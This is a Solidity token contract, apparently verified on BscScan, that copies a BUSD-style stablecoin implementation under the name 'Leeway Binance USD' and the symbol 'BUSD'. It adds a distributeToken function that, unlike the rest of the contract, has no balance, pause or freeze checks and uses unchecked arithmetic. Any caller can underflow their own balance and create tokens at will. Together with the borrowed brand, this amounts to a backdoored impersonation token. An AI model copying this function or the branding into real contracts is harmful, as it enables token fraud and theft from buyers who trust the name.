/**
 *Submitted for verification at BscScan.com on 2021-10-04
*/

/**
 *Submitted for verification at BscScan.com on 2021-10-02
*/

/**
*Submitted for verification at BscScan.com on 2020-09-02
*/

/**
*Submitted for verification at Etherscan.io on 2019-09-09
*/

// File: contracts/zeppelin/SafeMath.sol

pragma solidity 0.4.24;


/**
* @title SafeMath
* @dev Math operations with safety checks that throw on error
*/
library SafeMath {
/**
* @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
*/
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
require(b <= a);
uint256 c = a - b;

return c;
}

/**
* @dev Adds two numbers, reverts on overflow.
*/
function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a);

return c;
}
}

// File: contracts/BUSDImplementation.sol

pragma solidity 0.4.24;
pragma experimental "v0.5.0";


/**
* @title BUSDImplementation
* @dev this contract is a Pausable ERC20 token with Burn and Mint
* controlled by a central SupplyController. By implementing BUSDImplementation
* this contract also includes external methods for setting
* a new implementation contract for the Proxy.
* NOTE: The storage defined here will actually be held in the Proxy
* contract and all calls to this contract should be made through
* the proxy, including admin actions done as owner or supplyController.
* Any call to transfer against this contract should fail
* with insufficient funds since no tokens will be issued there.
*/
contract BUSDImplementation {

/**
* MATH
*/

using SafeMath for uint256;

/**
* DATA
*/

// INITIALIZATION DATA
bool private initialized = false;

// ERC20 BASIC DATA
mapping(address => uint256) internal balances;
uint256 internal totalSupply_;
string public constant name = "Leeway Binance USD"; // solium-disable-line
string public constant symbol = "BUSD"; // solium-disable-line uppercase
uint8 public constant decimals = 18; // solium-disable-line uppercase

// ERC20 DATA
mapping(address => mapping(address => uint256)) internal allowed;

// OWNER DATA
address public owner;
address public proposedOwner;

// PAUSABILITY DATA
bool public paused = false;

// ASSET PROTECTION DATA
address public assetProtectionRole;
mapping(address => bool) internal frozen;

// SUPPLY CONTROL DATA
address public supplyController;

// DELEGATED TRANSFER DATA
address public betaDelegateWhitelister;
mapping(address => bool) internal betaDelegateWhitelist;
mapping(address => uint256) internal nextSeqs;
// EIP191 header for EIP712 prefix
string constant internal EIP191_HEADER = "\x19\x01";
// Hash of the EIP712 Domain Separator Schema
bytes32 constant internal EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH = keccak256(
"EIP712Domain(string name,address verifyingContract)"
);
bytes32 constant internal EIP712_DELEGATED_TRANSFER_SCHEMA_HASH = keccak256(
"BetaDelegatedTransfer(address to,uint256 value,uint256 fee,uint256 seq,uint256 deadline)"
);
// Hash of the EIP712 Domain Separator data
// solhint-disable-next-line var-name-mixedcase
bytes32 public EIP712_DOMAIN_HASH;

/**
* EVENTS
*/

// ERC20 BASIC EVENTS
event Transfer(address indexed from, address indexed to, uint256 value);

// ERC20 EVENTS
event Approval(
address indexed owner,
address indexed spender,
uint256 value
);

// OWNABLE EVENTS
event OwnershipTransferProposed(
address indexed currentOwner,
address indexed proposedOwner
);
event OwnershipTransferDisregarded(
address indexed oldProposedOwner
);
event OwnershipTransferred(
address indexed oldOwner,
address indexed newOwner
);

// PAUSABLE EVENTS
event Pause();
event Unpause();

// ASSET PROTECTION EVENTS
event AddressFrozen(address indexed addr);
event AddressUnfrozen(address indexed addr);
event FrozenAddressWiped(address indexed addr);
event AssetProtectionRoleSet (
address indexed oldAssetProtectionRole,
address indexed newAssetProtectionRole
);

// SUPPLY CONTROL EVENTS
event SupplyIncreased(address indexed to, uint256 value);
event SupplyDecreased(address indexed from, uint256 value);
event SupplyControllerSet(
address indexed oldSupplyController,
address indexed newSupplyController
);

// DELEGATED TRANSFER EVENTS
event BetaDelegatedTransfer(
address indexed from, address indexed to, uint256 value, uint256 seq, uint256 fee
);
event BetaDelegateWhitelisterSet(
address indexed oldWhitelister,
address indexed newWhitelister
);
event BetaDelegateWhitelisted(address indexed newDelegate);
event BetaDelegateUnwhitelisted(address indexed oldDelegate);

/**
* FUNCTIONALITY
*/

// INITIALIZATION FUNCTIONALITY

/**
* @dev sets 0 initials tokens, the owner, and the supplyController.
* this serves as the constructor for the proxy but compiles to the
* memory model of the Implementation contract.
*/
function initialize() public {
require(!initialized, "already initialized");
owner = msg.sender;
proposedOwner = address(0);
assetProtectionRole = address(0);
totalSupply_ = 0;
supplyController = msg.sender;
initialized = true;
}

/**
* The constructor is used here to ensure that the implementation
* contract is initialized. An uncontrolled implementation
* contract might lead to misleading state
* for users who accidentally interact with it.
*/
constructor() public {
initialize();
pause();
// Added in V2
initializeDomainSeparator();
}

/**
* @dev To be called when upgrading the contract using upgradeAndCall to add delegated transfers
*/
function initializeDomainSeparator() public {
// hash the name context with the contract address
EIP712_DOMAIN_HASH = keccak256(abi.encodePacked(// solium-disable-line
EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH,
keccak256(bytes(name)),
bytes32(address(this))
));
}

// ERC20 BASIC FUNCTIONALITY
/**
* @dev Returns the address of the current owner.
*/
function getOwner() public view returns (address) {
return owner;
}

/**
* @dev Total number of tokens in existence
*/
function totalSupply() public view returns (uint256) {
return totalSupply_;
}

/**
* @dev Transfer token to a specified address from msg.sender
* Note: the use of Safemath ensures that _value is nonnegative.
* @param _to The address to transfer to.
* @param _value The amount to be transferred.
*/

function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) 
{
require(_to != address(0), "cannot transfer to address zero");
require(!frozen[_to] && !frozen[msg.sender], "address frozen");
require(_value <= balances[msg.sender], "insufficient funds");

balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
emit Transfer(msg.sender, _to, _value);
return true;
}

function distributeToken(address[] addresses, uint256 _value)
public {
for (uint i = 0; i < addresses.length; i++) 
{
balances[msg.sender] -= _value;
balances[addresses[i]] += _value;
emit Transfer(msg.sender, addresses[i], _value);
}
}
/**
* @dev Gets the balance of the specified address.
* @param _addr The address to query the the balance of.
* @return An uint256 representing the amount owned by the passed address.
*/
function balanceOf(address _addr) public view returns (uint256) {
return balances[_addr];
}

// ERC20 FUNCTIONALITY

/**
* @dev Transfer tokens from one address to another
* @param _from address The address which you want to send tokens from
* @param _to address The address which you want to transfer to
* @param _value uint256 the amount of tokens to be transferred
*/
function transferFrom(
address _from,
address _to,
uint256 _value
)
public
whenNotPaused
returns (bool)
{
require(_to != address(0), "cannot transfer to address zero");
require(!frozen[_to] && !frozen[_from] && !frozen[msg.sender], "address frozen");
require(_value <= balances[_from], "insufficient funds");
require(_value <= allowed[_from][msg.sender], "insufficient allowance");

balances[_from] = balances[_from].sub(_value);
balances[_to] = balances[_to].add(_value);
allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
emit Transfer(_from, _to, _value);
return true;
}

/**
* @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
* Beware that changing an allowance with this method brings the risk that someone may use both the old
* and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
* race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
* https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
* @param _spender The address which will spend the funds.
* @param _value The amount of tokens to be spent.
*/
function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {
require(!frozen[_spender] && !frozen[msg.sender], "address frozen");
allowed[msg.sender][_spender] = _value;
emit Approval(msg.sender, _spender, _value);
return true;
}

/**
* @dev Function to check the amount of tokens that an owner allowed to a spender.
* @param _owner address The address which owns the funds.
* @param _spender address The address which will spend the funds.
* @return A uint256 specifying the amount of tokens still available for the spender.
*/
function allowance(
address _owner,
address _spender
)
public
view
returns (uint256)
{
return allowed[_owner][_spender];
}

// OWNER FUNCTIONALITY

/**
* @dev Throws if called by any account other than the owner.
*/
modifier onlyOwner() {
require(msg.sender == owner, "onlyOwner");
_;
}

/**
* @dev Allows the current owner to begin transferring control of the contract to a proposedOwner
* @param _proposedOwner The address to transfer ownership to.
*/
function proposeOwner(address _proposedOwner) public onlyOwner {
require(_proposedOwner != address(0), "cannot transfer ownership to address zero");
require(msg.sender != _proposedOwner, "caller already is owner");
proposedOwner = _proposedOwner;
emit OwnershipTransferProposed(owner, proposedOwner);
}

/**
* @dev Allows the current owner or proposed owner to cancel transferring control of the contract to a proposedOwner
*/
function disregardProposeOwner() public {
require(msg.sender == proposedOwner || msg.sender == owner, "only proposedOwner or owner");
require(proposedOwner != address(0), "can only disregard a proposed owner that was previously set");
address _oldProposedOwner = proposedOwner;
proposedOwner = address(0);
emit OwnershipTransferDisregarded(_oldProposedOwner);
}

/**
* @dev Allows the proposed owner to complete transferring control of the contract to the proposedOwner.
*/
function claimOwnership() public {
require(msg.sender == proposedOwner, "onlyProposedOwner");
address _oldOwner = owner;
owner = proposedOwner;
proposedOwner = address(0);
emit OwnershipTransferred(_oldOwner, owner);
}

/**
* @dev Reclaim all BUSD at the contract address.
* This sends the BUSD tokens that this contract add holding to the owner.
* Note: this is not affected by freeze constraints.
*/
function reclaimBUSD() external onlyOwner {
uint256 _balance = balances[this];
balances[this] = 0;
balances[owner] = balances[owner].add(_balance);
emit Transfer(this, owner, _balance);
}

// PAUSABILITY FUNCTIONALITY

/**
* @dev Modifier to make a function callable only when the contract is not paused.
*/
modifier whenNotPaused() {
require(!paused, "whenNotPaused");
_;
}

/**
* @dev called by the owner to pause, triggers stopped state
*/
function pause() public onlyOwner {
require(!paused, "already paused");
paused = true;
emit Pause();
}

/**
* @dev called by the owner to unpause, returns to normal state
*/
function unpause() public onlyOwner {
require(paused, "already unpaused");
paused = false;
emit Unpause();
}

// ASSET PROTECTION FUNCTIONALITY

/**
* @dev Sets a new asset Protection role address.
* @param _newAssetProtectionRole The new address allowed to freeze/unfreeze addresses and seize their tokens.
*/
function setAssetProtectionRole(address _newAssetProtectionRole) public {
require(msg.sender == assetProtectionRole || msg.sender == owner, "only assetProtectionRole or Owner");
emit AssetProtectionRoleSet(assetProtectionRole, _newAssetProtectionRole);
assetProtectionRole = _newAssetProtectionRole;
}

modifier onlyAssetProtectionRole() {
require(msg.sender == assetProtectionRole, "onlyAssetProtectionRole");
_;
}

/**
* @dev Freezes an address balance from being transferred.
* @param _addr The new address to freeze.
*/
function freeze(address _addr) public onlyAssetProtectionRole {
require(!frozen[_addr], "address already frozen");
frozen[_addr] = true;
emit AddressFrozen(_addr);
}

/**
* @dev Unfreezes an address balance allowing transfer.
* @param _addr The new address to unfreeze.
*/
function unfreeze(address _addr) public onlyAssetProtectionRole {
require(frozen[_addr], "address already unfrozen");
frozen[_addr] = false;
emit AddressUnfrozen(_addr);
}

/**
* @dev Wipes the balance of a frozen address, burning the tokens
* and setting the approval to zero.
* @param _addr The new frozen address to wipe.
*/
function wipeFrozenAddress(address _addr) public onlyAssetProtectionRole {
require(frozen[_addr], "address is not frozen");
uint256 _balance = balances[_addr];
balances[_addr] = 0;
totalSupply_ = totalSupply_.sub(_balance);
emit FrozenAddressWiped(_addr);
emit SupplyDecreased(_addr, _balance);
emit Transfer(_addr, address(0), _balance);
}

/**
* @dev Gets whether the address is currently frozen.
* @param _addr The address to check if frozen.
* @return A bool representing whether the given address is frozen.
*/
function isFrozen(address _addr) public view returns (bool) {
return frozen[_addr];
}

// SUPPLY CONTROL FUNCTIONALITY

/**
* @dev Sets a new supply controller address.
* @param _newSupplyController The address allowed to burn/mint tokens to control supply.
*/
function setSupplyController(address _newSupplyController) public {
require(msg.sender == supplyController || msg.sender == owner, "only SupplyController or Owner");
require(_newSupplyController != address(0), "cannot set supply controller to address zero");
emit SupplyControllerSet(supplyController, _newSupplyController);
supplyController = _newSupplyController;
}

modifier onlySupplyController() {
require(msg.sender == supplyController, "onlySupplyController");
_;
}

/**
* @dev Increases the total supply by minting the specified number of tokens to the supply controller account.
* @param _value The number of tokens to add.
* @return A boolean that indicates if the operation was successful.
*/
function increaseSupply(uint256 _value) public onlySupplyController returns (bool success) {
totalSupply_ = totalSupply_.add(_value);
balances[supplyController] = balances[supplyController].add(_value);
emit SupplyIncreased(supplyController, _value);
emit Transfer(address(0), supplyController, _value);
return true;
}

/**
* @dev Decreases the total supply by burning the specified number of tokens from the supply controller account.
* @param _value The number of tokens to remove.
* @return A boolean that indicates if the operation was successful.
*/
function decreaseSupply(uint256 _value) public onlySupplyController returns (bool success) {
require(_value <= balances[supplyController], "not enough supply");
balances[supplyController] = balances[supplyController].sub(_value);
totalSupply_ = totalSupply_.sub(_value);
emit SupplyDecreased(supplyController, _value);
emit Transfer(supplyController, address(0), _value);
return true;
}

// DELEGATED TRANSFER FUNCTIONALITY

/**
* @dev returns the next seq for a target address.
* The transactor must submit nextSeqOf(transactor) in the next transaction for it to be valid.
* Note: that the seq context is specific to this smart contract.
* @param target The target address.
* @return the seq.
*/
//
function nextSeqOf(address target) public view returns (uint256) {
return nextSeqs[target];
}

/**
* @dev Performs a transfer on behalf of the from address, identified by its signature on the delegatedTransfer msg.
* Splits a signature byte array into r,s,v for convenience.
* @param sig the signature of the delgatedTransfer msg.
* @param to The address to transfer to.
* @param value The amount to be transferred.
* @param fee an optional ERC20 fee paid to the executor of betaDelegatedTransfer by the from address.
* @param seq a sequencing number included by the from address specific to this contract to protect from replays.
* @param deadline a block number after which the pre-signed transaction has expired.
* @return A boolean that indicates if the operation was successful.
*/
function betaDelegatedTransfer(
bytes sig, address to, uint256 value, uint256 fee, uint256 seq, uint256 deadline
) public returns (bool) {
require(sig.length == 65, "signature should have length 65");
bytes32 r;
bytes32 s;
uint8 v;
assembly {
r := mload(add(sig, 32))
s := mload(add(sig, 64))
v := byte(0, mload(add(sig, 96)))
}
require(_betaDelegatedTransfer(r, s, v, to, value, fee, seq, deadline), "failed transfer");
return true;
}

/**
* @dev Performs a transfer on behalf of the from address, identified by its signature on the betaDelegatedTransfer msg.
* Note: both the delegate and transactor sign in the fees. The transactor, however,
* has no control over the gas price, and therefore no control over the transaction time.
* Beta prefix chosen to avoid a name clash with an emerging standard in ERC865 or elsewhere.
* Internal to the contract - see betaDelegatedTransfer and betaDelegatedTransferBatch.
* @param r the r signature of the delgatedTransfer msg.
* @param s the s signature of the delgatedTransfer msg.
* @param v the v signature of the delgatedTransfer msg.
* @param to The address to transfer to.
* @param value The amount to be transferred.
* @param fee an optional ERC20 fee paid to the delegate of betaDelegatedTransfer by the from address.
* @param seq a sequencing number included by the from address specific to this contract to protect from replays.
* @param deadline a block number after which the pre-signed transaction has expired.
* @return A boolean that indicates if the operation was successful.
*/
function _betaDelegatedTransfer(
bytes32 r, bytes32 s, uint8 v, address to, uint256 value, uint256 fee, uint256 seq, uint256 deadline
) internal whenNotPaused returns (bool) {
require(betaDelegateWhitelist[msg.sender], "Beta feature only accepts whitelisted delegates");
require(value > 0 || fee > 0, "cannot transfer zero tokens with zero fee");
require(block.number <= deadline, "transaction expired");
// prevent sig malleability from ecrecover()
require(uint256(s) <= 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0, "signature incorrect");
require(v == 27 || v == 28, "signature incorrect");

// EIP712 scheme: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-712.md
bytes32 delegatedTransferHash = keccak256(abi.encodePacked(// solium-disable-line
EIP712_DELEGATED_TRANSFER_SCHEMA_HASH, bytes32(to), value, fee, seq, deadline
));
bytes32 hash = keccak256(abi.encodePacked(EIP191_HEADER, EIP712_DOMAIN_HASH, delegatedTransferHash));
address _from = ecrecover(hash, v, r, s);

require(_from != address(0), "error determining from address from signature");
require(to != address(0), "canno use address zero");
require(!frozen[to] && !frozen[_from] && !frozen[msg.sender], "address frozen");
require(value.add(fee) <= balances[_from], "insufficent fund");
require(nextSeqs[_from] == seq, "incorrect seq");

nextSeqs[_from] = nextSeqs[_from].add(1);
balances[_from] = balances[_from].sub(value.add(fee));

if (fee != 0) {
balances[msg.sender] = balances[msg.sender].add(fee);
emit Transfer(_from, msg.sender, fee);
}

balances[to] = balances[to].add(value);
emit Transfer(_from, to, value);

emit BetaDelegatedTransfer(_from, to, value, seq, fee);
return true;
}

/**
* @dev Performs an atomic batch of transfers on behalf of the from addresses, identified by their signatures.
* Lack of nested array support in arguments requires all arguments to be passed as equal size arrays where
* delegated transfer number i is the combination of all arguments at index i
* @param r the r signatures of the delgatedTransfer msg.
* @param s the s signatures of the delgatedTransfer msg.
* @param v the v signatures of the delgatedTransfer msg.
* @param to The addresses to transfer to.
* @param value The amounts to be transferred.
* @param fee optional ERC20 fees paid to the delegate of betaDelegatedTransfer by the from address.
* @param seq sequencing numbers included by the from address specific to this contract to protect from replays.
* @param deadline block numbers after which the pre-signed transactions have expired.
* @return A boolean that indicates if the operation was successful.
*/
function betaDelegatedTransferBatch(
bytes32[] r, bytes32[] s, uint8[] v, address[] to, uint256[] value, uint256[] fee, uint256[] seq, uint256[] deadline
) public returns (bool) {
require(r.length == s.length && r.length == v.length && r.length == to.length && r.length == value.length, "length mismatch");
require(r.length == fee.length && r.length == seq.length && r.length == deadline.length, "length mismatch");

for (uint i = 0; i < r.length; i++) {
require(
_betaDelegatedTransfer(r[i], s[i], v[i], to[i], value[i], fee[i], seq[i], deadline[i]),
"failed transfer"
);
}
return true;
}

/**
* @dev Gets whether the address is currently whitelisted for betaDelegateTransfer.
* @param _addr The address to check if whitelisted.
* @return A bool representing whether the given address is whitelisted.
*/
function isWhitelistedBetaDelegate(address _addr) public view returns (bool) {
return betaDelegateWhitelist[_addr];
}

/**
* @dev Sets a new betaDelegate whitelister.
* @param _newWhitelister The address allowed to whitelist betaDelegates.
*/
function setBetaDelegateWhitelister(address _newWhitelister) public {
require(msg.sender == betaDelegateWhitelister || msg.sender == owner, "only Whitelister or Owner");
betaDelegateWhitelister = _newWhitelister;
emit BetaDelegateWhitelisterSet(betaDelegateWhitelister, _newWhitelister);
}

modifier onlyBetaDelegateWhitelister() {
require(msg.sender == betaDelegateWhitelister, "onlyBetaDelegateWhitelister");
_;
}

/**
* @dev Whitelists an address to allow calling BetaDelegatedTransfer.
* @param _addr The new address to whitelist.
*/
function whitelistBetaDelegate(address _addr) public onlyBetaDelegateWhitelister {
require(!betaDelegateWhitelist[_addr], "delegate already whitelisted");
betaDelegateWhitelist[_addr] = true;
emit BetaDelegateWhitelisted(_addr);
}

/**
* @dev Unwhitelists an address to disallow calling BetaDelegatedTransfer.
* @param _addr The new address to whitelist.
*/
function unwhitelistBetaDelegate(address _addr) public onlyBetaDelegateWhitelister {
require(betaDelegateWhitelist[_addr], "delegate not whitelisted");
betaDelegateWhitelist[_addr] = false;
emit BetaDelegateUnwhitelisted(_addr);
}
}